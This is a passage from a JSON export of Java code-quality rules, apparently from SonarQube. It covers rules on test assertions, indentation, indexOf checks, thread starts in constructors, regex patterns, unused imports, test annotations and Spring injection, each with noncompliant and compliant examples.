            "mdDesc": "<p>AssertJ assertions <code>allMatch</code> and <code>doesNotContains</code> on an empty list always&nbsp;returns true whatever the content of the\npredicate. Despite being correct, you should make explicit if you expect an empty list or not, by adding\n<code>isEmpty()</code>/<code>isNotEmpty()</code> in addition to calling the assertion, or by testing the list's content further. It will justify the\nuseless predicate to improve clarity or increase the reliability of the test.</p>\n<p>This rule raises an issue when any of the methods listed are used without asserting that the list is empty or not and without testing the\ncontent.</p>\n<p>Targetted methods:</p>\n<ul>\n  <li> <code>allMatch</code> </li>\n  <li> <code>allSatisfy</code> </li>\n  <li> <code>doesNotContain</code> </li>\n  <li> <code>doesNotContainSequence</code> </li>\n  <li> <code>doesNotContainSubsequence</code> </li>\n  <li> <code>doesNotContainAnyElementsOf</code> </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\nList&lt;String&gt; logs = getLogs();\n\nassertThat(logs).allMatch(e -&gt; e.contains(“error”)); // Noncompliant, this test pass if logs are empty!\nassertThat(logs).doesNotContain(\"error\"); // Noncompliant, do you expect any log?\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nList&lt;String&gt; logs = getLogs();\n\nassertThat(logs).isNotEmpty().allMatch(e -&gt; e.contains(“error”));\n// Or\nassertThat(logs).hasSize(5).allMatch(e -&gt; e.contains(“error”));\n// Or\nassertThat(logs).isEmpty();\n\n// Despite being redundant, this is also acceptable since it explains why you expect an empty list\nassertThat(logs).doesNotContain(\"error\").isEmpty();\n// or test the content of the list further\nassertThat(logs).contains(\"warning\").doesNotContain(\"error\");\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "assertj",
                "tests"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "debtOverloaded": false,
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S1120",
            "repo": "java",
            "name": "Source code should be indented consistently",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Proper indentation is a simple and effective way to improve the code's readability. Consistent indentation among the developers within a team also\nreduces the differences that are committed to source control systems, making code reviews easier. </p>\n<p>This rule raises an issue when indentation does not match the configured value. Only the first line of a badly indented section is reported.</p>\n<h2>Noncompliant Code Example</h2>\n<p>With an indent size of 2:</p>\n<pre>\nclass Foo {\n  public int a;\n   public int b;   // Noncompliant, expected to start at column 4\n\n...\n\n  public void doSomething() {\n    if(something) {\n          doSomethingElse();  // Noncompliant, expected to start at column 6\n  }   // Noncompliant, expected to start at column 4\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass Foo {\n  public int a;\n  public int b;\n\n...\n\n  public void doSomething() {\n    if(something) {\n        doSomethingElse();\n    }\n  }\n}\n</pre>",
            "mdDesc": "<p>Proper indentation is a simple and effective way to improve the code's readability. Consistent indentation among the developers within a team also\nreduces the differences that are committed to source control systems, making code reviews easier. </p>\n<p>This rule raises an issue when indentation does not match the configured value. Only the first line of a badly indented section is reported.</p>\n<h2>Noncompliant Code Example</h2>\n<p>With an indent size of 2:</p>\n<pre>\nclass Foo {\n  public int a;\n   public int b;   // Noncompliant, expected to start at column 4\n\n...\n\n  public void doSomething() {\n    if(something) {\n          doSomethingElse();  // Noncompliant, expected to start at column 6\n  }   // Noncompliant, expected to start at column 4\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass Foo {\n  public int a;\n  public int b;\n\n...\n\n  public void doSomething() {\n    if(something) {\n        doSomethingElse();\n    }\n  }\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "style"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "indentationLevel",
                    "htmlDesc": "Number of white-spaces of an indent.",
                    "defaultValue": "2",
                    "type": "INTEGER"
                }
            ],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "1min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "1min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "1min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "1min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2692",
            "repo": "java",
            "name": "\"indexOf\" checks should not be for positive numbers",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Most checks against an <code>indexOf</code> value compare it with -1 because 0 is a valid index. Any checks which look for values &gt;0 ignore the\nfirst element, which is likely a bug. If the intent is merely to check inclusion of a value in a <code>String</code> or a <code>List</code>, consider\nusing the <code>contains</code> method instead.</p>\n<p>This rule raises an issue when an <code>indexOf</code> value retrieved either from a <code>String</code> or a <code>List</code> is tested against\n<code>&gt;0</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString color = \"blue\";\nString name = \"ishmael\";\n\nList&lt;String&gt; strings = new ArrayList&lt;String&gt; ();\nstrings.add(color);\nstrings.add(name);\n\nif (strings.indexOf(color) &gt; 0) {  // Noncompliant\n  // ...\n}\nif (name.indexOf(\"ish\") &gt; 0) { // Noncompliant\n  // ...\n}\nif (name.indexOf(\"ae\") &gt; 0) { // Noncompliant\n  // ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString color = \"blue\";\nString name = \"ishmael\";\n\nList&lt;String&gt; strings = new ArrayList&lt;String&gt; ();\nstrings.add(color);\nstrings.add(name);\n\nif (strings.indexOf(color) &gt; -1) {\n  // ...\n}\nif (name.indexOf(\"ish\") &gt;= 0) {\n  // ...\n}\nif (name.contains(\"ae\") {\n  // ...\n}\n</pre>",
            "mdDesc": "<p>Most checks against an <code>indexOf</code> value compare it with -1 because 0 is a valid index. Any checks which look for values &gt;0 ignore the\nfirst element, which is likely a bug. If the intent is merely to check inclusion of a value in a <code>String</code> or a <code>List</code>, consider\nusing the <code>contains</code> method instead.</p>\n<p>This rule raises an issue when an <code>indexOf</code> value retrieved either from a <code>String</code> or a <code>List</code> is tested against\n<code>&gt;0</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString color = \"blue\";\nString name = \"ishmael\";\n\nList&lt;String&gt; strings = new ArrayList&lt;String&gt; ();\nstrings.add(color);\nstrings.add(name);\n\nif (strings.indexOf(color) &gt; 0) {  // Noncompliant\n  // ...\n}\nif (name.indexOf(\"ish\") &gt; 0) { // Noncompliant\n  // ...\n}\nif (name.indexOf(\"ae\") &gt; 0) { // Noncompliant\n  // ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString color = \"blue\";\nString name = \"ishmael\";\n\nList&lt;String&gt; strings = new ArrayList&lt;String&gt; ();\nstrings.add(color);\nstrings.add(name);\n\nif (strings.indexOf(color) &gt; -1) {\n  // ...\n}\nif (name.indexOf(\"ish\") &gt;= 0) {\n  // ...\n}\nif (name.contains(\"ae\") {\n  // ...\n}\n</pre>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "suspicious"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5961",
            "repo": "java",
            "name": "Test methods should not contain too many assertions",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>A common good practice is to write test methods targeting only one logical concept, that can only fail for one reason.</p>\n<p>While it might make sense to have more than one assertion to test one concept, having too many is a sign that a test became too complex and should\nbe refactored to multiples ones.</p>\n<p>This rule will report any test method containing more than a given number of assertion.</p>\n<h2>Noncompliant Code Example</h2>\n<p>With a parameter of 2.</p>\n<pre>\n@Test\nvoid test() { // Refactor this method.\n  assertEquals(1, f(1));\n  assertEquals(2, f(2));\n  assertEquals(3, g(1));\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nvoid test_f() {\n  assertEquals(1, f(1));\n  assertEquals(2, f(2));\n}\nvoid test_g() {\n  assertEquals(3, g(1));\n}\n</pre>",
            "mdDesc": "<p>A common good practice is to write test methods targeting only one logical concept, that can only fail for one reason.</p>\n<p>While it might make sense to have more than one assertion to test one concept, having too many is a sign that a test became too complex and should\nbe refactored to multiples ones.</p>\n<p>This rule will report any test method containing more than a given number of assertion.</p>\n<h2>Noncompliant Code Example</h2>\n<p>With a parameter of 2.</p>\n<pre>\n@Test\nvoid test() { // Refactor this method.\n  assertEquals(1, f(1));\n  assertEquals(2, f(2));\n  assertEquals(3, g(1));\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nvoid test_f() {\n  assertEquals(1, f(1));\n  assertEquals(2, f(2));\n}\nvoid test_g() {\n  assertEquals(3, g(1));\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "tests"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "MaximumAssertionNumber",
                    "htmlDesc": "The maximum authorized number of assertions in a test method",
                    "defaultValue": "25",
                    "type": "INTEGER"
                }
            ],
            "debtOverloaded": false,
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2693",
            "repo": "java",
            "name": "Threads should not be started in constructors",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The problem with invoking <code>Thread.start()</code> in a constructor is that you'll have a confusing mess on your hands if the class is ever\nextended because the superclass' constructor will start the thread before the child class has truly been initialized.</p>\n<p>This rule raises an issue any time <code>start</code> is invoked in the constructor of a non-<code>final</code> class.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass {\n\n  Thread thread = null;\n\n  public MyClass(Runnable runnable) {\n    thread = new Thread(runnable);\n    thread.start(); // Noncompliant\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/FDdGBQ\">CERT, TSM02-J.</a> - Do not use background threads during class initialization </li>\n</ul>",
            "mdDesc": "<p>The problem with invoking <code>Thread.start()</code> in a constructor is that you'll have a confusing mess on your hands if the class is ever\nextended because the superclass' constructor will start the thread before the child class has truly been initialized.</p>\n<p>This rule raises an issue any time <code>start</code> is invoked in the constructor of a non-<code>final</code> class.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass {\n\n  Thread thread = null;\n\n  public MyClass(Runnable runnable) {\n    thread = new Thread(runnable);\n    thread.start(); // Noncompliant\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/FDdGBQ\">CERT, TSM02-J.</a> - Do not use background threads during class initialization </li>\n</ul>",
            "severity": "BLOCKER",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "multi-threading",
                "pitfall"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "30min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "30min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "30min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "30min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5840",
            "repo": "java",
            "name": "Regex patterns and their sub-patterns should not always fail",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Using certain features of regular expressions, it is possible to create regular expressions that can never match or contain subpatterns that can\nnever match. Since a pattern or sub-pattern that can never match any input is pointless, this is a sign that the pattern does not work as intended and\nneeds to be fixed.</p>\n<p>This rule finds some such regular expressions and subpatterns, specifically ones that meet one of the following conditions:</p>\n<ul>\n  <li> Beginning- and end-of-line/input boundaries appearing in a position where they can never match (e.g. an end-of-input marker being followed by\n  other characters) </li>\n  <li> A back reference refers to a capturing group that will never be matched before the back reference </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<h3>Boundaries</h3>\n<pre>\n$[a-z]*^\n</pre>\n<h3>Backreference</h3>\n<pre>\n\\1(.)\n</pre>\n<h2>Compliant Solution</h2>\n<h3>Boundaries</h3>\n<pre>\n^[a-z]*$\n</pre>\n<h3>Backreference</h3>\n<pre>\n(.)\\1\n</pre>\n<h2>Deprecated</h2>\n<p>This rule is deprecated; use <a href='/coding_rules#rule_key=java%3AS5996'>S5996</a>, <a href='/coding_rules#rule_key=java%3AS6001'>S6001</a> instead.</p>",
            "mdDesc": "<p>Using certain features of regular expressions, it is possible to create regular expressions that can never match or contain subpatterns that can\nnever match. Since a pattern or sub-pattern that can never match any input is pointless, this is a sign that the pattern does not work as intended and\nneeds to be fixed.</p>\n<p>This rule finds some such regular expressions and subpatterns, specifically ones that meet one of the following conditions:</p>\n<ul>\n  <li> Beginning- and end-of-line/input boundaries appearing in a position where they can never match (e.g. an end-of-input marker being followed by\n  other characters) </li>\n  <li> A back reference refers to a capturing group that will never be matched before the back reference </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<h3>Boundaries</h3>\n<pre>\n$[a-z]*^\n</pre>\n<h3>Backreference</h3>\n<pre>\n\\1(.)\n</pre>\n<h2>Compliant Solution</h2>\n<h3>Boundaries</h3>\n<pre>\n^[a-z]*$\n</pre>\n<h3>Backreference</h3>\n<pre>\n(.)\\1\n</pre>\n<h2>Deprecated</h2>\n<p>This rule is deprecated; use {rule:java:S5996}, {rule:java:S6001} instead.</p>",
            "severity": "CRITICAL",
            "status": "DEPRECATED",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S1128",
            "repo": "java",
            "name": "Unnecessary imports should be removed",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The imports part of a file should be handled by the Integrated Development Environment (IDE), not manually by the developer. </p>\n<p>Unused and useless imports should not occur if that is the case. </p>\n<p>Leaving them in reduces the code's readability, since their presence can be confusing.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npackage my.company;\n\nimport java.lang.String;        // Noncompliant; java.lang classes are always implicitly imported\nimport my.company.SomeClass;    // Noncompliant; same-package files are always implicitly imported\nimport java.io.File;            // Noncompliant; File is not used\n\nimport my.company2.SomeType;\nimport my.company2.SomeType;    // Noncompliant; 'SomeType' is already imported\n\nclass ExampleClass {\n\n  public String someString;\n  public SomeType something;\n\n}\n</pre>\n<h2>Exceptions</h2>\n<p>Imports for types mentioned in comments, such as Javadocs, are ignored.</p>",
            "mdDesc": "<p>The imports part of a file should be handled by the Integrated Development Environment (IDE), not manually by the developer. </p>\n<p>Unused and useless imports should not occur if that is the case. </p>\n<p>Leaving them in reduces the code's readability, since their presence can be confusing.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npackage my.company;\n\nimport java.lang.String;        // Noncompliant; java.lang classes are always implicitly imported\nimport my.company.SomeClass;    // Noncompliant; same-package files are always implicitly imported\nimport java.io.File;            // Noncompliant; File is not used\n\nimport my.company2.SomeType;\nimport my.company2.SomeType;    // Noncompliant; 'SomeType' is already imported\n\nclass ExampleClass {\n\n  public String someString;\n  public SomeType something;\n\n}\n</pre>\n<h2>Exceptions</h2>\n<p>Imports for types mentioned in comments, such as Javadocs, are ignored.</p>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "unused"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5846",
            "repo": "java",
            "name": "Empty lines should not be tested with regex MULTILINE flag",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>One way to test for empty lines is to use the regex <code>\"^$\"</code>, which can be extremely handy when filtering out empty lines from collections\nof Strings, for instance. With regard to this, the Javadoc for <a\nhref=\"https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/util/regex/Pattern.html\">Pattern (Line Terminators)</a> states the\nfollowing:</p>\n<blockquote>\n  <p>By default, the regular expressions ^ and <code>$</code> ignore line terminators and only match at the beginning and the end, respectively, of\n  the entire input sequence. If <code>MULTILINE</code> mode is activated then ^ matches at the beginning of input and after any line terminator\n  <strong>except at the end of input</strong>. When in <code>MULTILINE</code> mode <code>$</code> matches just before a line terminator or the end of\n  the input sequence.</p>\n</blockquote>\n<p>As emphasized, ^ is not going to match at the end of an input, and the end of the input is necessarily included in the empty string, which might\nlead to completely missing empty lines, while it would be the initial reason for using such regex.</p>\n<p>Therefore, when searching for empty lines using a multi-line regular expression, you should also check whether the string is empty.</p>\n<p>This rule is raising an issue every time a pattern that can match the empty string is used with <code>MULTILINE</code> flag and without calling\n<code>isEmpty()</code> on the string.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nstatic final Pattern p = Pattern.compile(\"^$\", Pattern.MULTILINE); // Noncompliant\n\n// Alternatively\nstatic final Pattern p = Pattern.compile(\"(?m)^$\"); // Noncompliant\n\n\nboolean containsEmptyLines(String str) {\n    return p.matcher(str).find();\n}\n\n// ...\nSystem.out.println(containsEmptyLines(\"a\\n\\nb\")); // correctly prints 'true'\nSystem.out.println(containsEmptyLines(\"\")); // incorrectly prints 'false'\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nstatic final Pattern p = Pattern.compile(\"^$\", Pattern.MULTILINE);\n\nboolean containsEmptyLines(String str) {\n    return p.matcher(str).find() || str.isEmpty();\n}\n\n// ...\nSystem.out.println(containsEmptyLines(\"a\\n\\nb\")); // correctly prints 'true'\nSystem.out.println(containsEmptyLines(\"\")); // also correctly prints 'true'\n</pre>",
            "mdDesc": "<p>One way to test for empty lines is to use the regex <code>\"^$\"</code>, which can be extremely handy when filtering out empty lines from collections\nof Strings, for instance. With regard to this, the Javadoc for <a\nhref=\"https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/util/regex/Pattern.html\">Pattern (Line Terminators)</a> states the\nfollowing:</p>\n<blockquote>\n  <p>By default, the regular expressions ^ and <code>$</code> ignore line terminators and only match at the beginning and the end, respectively, of\n  the entire input sequence. If <code>MULTILINE</code> mode is activated then ^ matches at the beginning of input and after any line terminator\n  <strong>except at the end of input</strong>. When in <code>MULTILINE</code> mode <code>$</code> matches just before a line terminator or the end of\n  the input sequence.</p>\n</blockquote>\n<p>As emphasized, ^ is not going to match at the end of an input, and the end of the input is necessarily included in the empty string, which might\nlead to completely missing empty lines, while it would be the initial reason for using such regex.</p>\n<p>Therefore, when searching for empty lines using a multi-line regular expression, you should also check whether the string is empty.</p>\n<p>This rule is raising an issue every time a pattern that can match the empty string is used with <code>MULTILINE</code> flag and without calling\n<code>isEmpty()</code> on the string.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nstatic final Pattern p = Pattern.compile(\"^$\", Pattern.MULTILINE); // Noncompliant\n\n// Alternatively\nstatic final Pattern p = Pattern.compile(\"(?m)^$\"); // Noncompliant\n\n\nboolean containsEmptyLines(String str) {\n    return p.matcher(str).find();\n}\n\n// ...\nSystem.out.println(containsEmptyLines(\"a\\n\\nb\")); // correctly prints 'true'\nSystem.out.println(containsEmptyLines(\"\")); // incorrectly prints 'false'\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nstatic final Pattern p = Pattern.compile(\"^$\", Pattern.MULTILINE);\n\nboolean containsEmptyLines(String str) {\n    return p.matcher(str).find() || str.isEmpty();\n}\n\n// ...\nSystem.out.println(containsEmptyLines(\"a\\n\\nb\")); // correctly prints 'true'\nSystem.out.println(containsEmptyLines(\"\")); // also correctly prints 'true'\n</pre>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "regex"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5967",
            "repo": "java",
            "name": "Tests method should not be annotated with competing annotations",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Annotating unit tests with more than one test-related annotation is not only useless but could also result in unexpected behavior like failing\ntests or unwanted side-effects.</p>\n<p>This rule reports an issue when a test method is annotated with more than one of the following competing annotation:</p>\n<ul>\n  <li> @Test </li>\n  <li> @RepeatedTest </li>\n  <li> @ParameterizedTest </li>\n  <li> @TestFactory </li>\n  <li> @TestTemplate </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Test\n@RepeatedTest(2) // Noncompliant, this test will be repeated 3 times\nvoid test() { }\n\n@ParameterizedTest\n@Test\n@MethodSource(\"methodSource\")\nvoid test2(int argument) { } // Noncompliant, this test will fail with ParameterResolutionException\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@RepeatedTest(2)\nvoid test() { }\n\n@ParameterizedTest\n@MethodSource(\"methodSource\")\nvoid test2(int argument) { }\n</pre>",
            "mdDesc": "<p>Annotating unit tests with more than one test-related annotation is not only useless but could also result in unexpected behavior like failing\ntests or unwanted side-effects.</p>\n<p>This rule reports an issue when a test method is annotated with more than one of the following competing annotation:</p>\n<ul>\n  <li> @Test </li>\n  <li> @RepeatedTest </li>\n  <li> @ParameterizedTest </li>\n  <li> @TestFactory </li>\n  <li> @TestTemplate </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Test\n@RepeatedTest(2) // Noncompliant, this test will be repeated 3 times\nvoid test() { }\n\n@ParameterizedTest\n@Test\n@MethodSource(\"methodSource\")\nvoid test2(int argument) { } // Noncompliant, this test will fail with ParameterResolutionException\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@RepeatedTest(2)\nvoid test() { }\n\n@ParameterizedTest\n@MethodSource(\"methodSource\")\nvoid test2(int argument) { }\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "tests"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "debtOverloaded": false,
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S3305",
            "repo": "java",
            "name": "Factory method injection should be used in \"@Configuration\" classes",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>When <code>@Autowired</code> is used, dependencies need to be resolved when the class is instantiated, which may cause early initialization of\nbeans or lead the context to look in places it shouldn't to find the bean. To avoid this tricky issue and optimize the way the context loads,\ndependencies should be requested as late as possible. That means using parameter injection instead of field injection for dependencies that are only\nused in a single <code>@Bean</code> method.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Configuration\npublic class ​FooConfiguration {\n\n  @Autowired private ​DataSource dataSource​;  // Noncompliant\n\n  @Bean\n  public ​MyService myService() {\n    return new ​MyService(this​.dataSource​);\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@Configuration\npublic class ​FooConfiguration {\n\n @Bean\n  public ​MyService myService(DataSource dataSource) {\n    return new ​MyService(dataSource);\n  }\n}\n</pre>\n<h2>Exceptions</h2>\n<p>Fields used in methods that are called directly by other methods in the application (as opposed to being invoked automatically by the Spring\nframework) are ignored by this rule so that direct callers don't have to provide the dependencies themselves.</p>",
            "mdDesc": "<p>When <code>@Autowired</code> is used, dependencies need to be resolved when the class is instantiated, which may cause early initialization of\nbeans or lead the context to look in places it shouldn't to find the bean. To avoid this tricky issue and optimize the way the context loads,\ndependencies should be requested as late as possible. That means using parameter injection instead of field injection for dependencies that are only\nused in a single <code>@Bean</code> method.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Configuration\npublic class ​FooConfiguration {\n\n  @Autowired private ​DataSource dataSource​;  // Noncompliant\n\n  @Bean\n  public ​MyService myService() {\n    return new ​MyService(this​.dataSource​);\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@Configuration\npublic class ​FooConfiguration {\n\n @Bean\n  public ​MyService myService(DataSource dataSource) {\n    return new ​MyService(dataSource);\n  }\n}\n</pre>\n<h2>Exceptions</h2>\n<p>Fields used in methods that are called directly by other methods in the application (as opposed to being invoked automatically by the Spring\nframework) are ignored by this rule so that direct callers don't have to provide the dependencies themselves.</p>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "performance",
                "spring"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5969",
            "repo": "java",
            "name": "Mocking all non-private methods of a class should be avoided",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>If you end up mocking every non-private method of a class in order to write tests, it is a strong sign that your test became too complex, or that\nyou misunderstood the way you are supposed to use the mocking mechanism.</p>\n<p>You should either refactor the test code into multiple units, or consider using the class itself, by either directly instantiating it, or creating\na new one inheriting from it, with the expected behavior.</p>\n<p>This rule reports an issue when every member of a given class are mocked.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Test\nvoid test_requiring_MyClass() {\n  MyClass myClassMock = mock(MyClass.class); // Noncompliant\n  when(myClassMock.f()).thenReturn(1);\n  when(myClassMock.g()).thenReturn(2);\n  //...\n}\n\nabstract class MyClass {\n  abstract int f();\n  abstract int g();\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@Test\nvoid test_requiring_MyClass() {\n  MyClass myClass = new MyClassForTest();\n  //...\n}\n\nclass MyClassForTest extends MyClass {\n\n  @Override\n  int f() {\n    return 1;\n  }\n\n  @Override\n  int g() {\n    return 2;\n  }\n}\n</pre>\n<p>or</p>\n<pre>\n@Test\nvoid test_requiring_f() {\n  MyClass myClassMock = mock(MyClass.class);\n  when(myClassMock.f()).thenReturn(1);\n  //...\n}\n\n@Test\nvoid test_requiring_g() {\n  MyClass myClassMock = mock(MyClass.class);\n  when(myClassMock.g()).thenReturn(2);\n  //...\n}\n\nabstract class MyClass {\n  abstract int f();\n  abstract int g();\n}\n</pre>",
            "mdDesc": "<p>If you end up mocking every non-private method of a class in order to write tests, it is a strong sign that your test became too complex, or that\nyou misunderstood the way you are supposed to use the mocking mechanism.</p>\n<p>You should either refactor the test code into multiple units, or consider using the class itself, by either directly instantiating it, or creating\na new one inheriting from it, with the expected behavior.</p>\n<p>This rule reports an issue when every member of a given class are mocked.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Test\nvoid test_requiring_MyClass() {\n  MyClass myClassMock = mock(MyClass.class); // Noncompliant\n  when(myClassMock.f()).thenReturn(1);\n  when(myClassMock.g()).thenReturn(2);\n  //...\n}\n\nabstract class MyClass {\n  abstract int f();\n  abstract int g();\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@Test\nvoid test_requiring_MyClass() {\n  MyClass myClass = new MyClassForTest();\n  //...\n}\n\nclass MyClassForTest extends MyClass {\n\n  @Override\n  int f() {\n    return 1;\n  }\n\n  @Override\n  int g() {\n    return 2;\n  }\n}\n</pre>\n<p>or</p>\n<pre>\n@Test\nvoid test_requiring_f() {\n  MyClass myClassMock = mock(MyClass.class);\n  when(myClassMock.f()).thenReturn(1);\n  //...\n}\n\n@Test\nvoid test_requiring_g() {\n  MyClass myClassMock = mock(MyClass.class);\n  when(myClassMock.g()).thenReturn(2);\n  //...\n}\n\nabstract class MyClass {\n  abstract int f();\n  abstract int g();\n}\n</pre>",
            "severity": "CRITICAL",
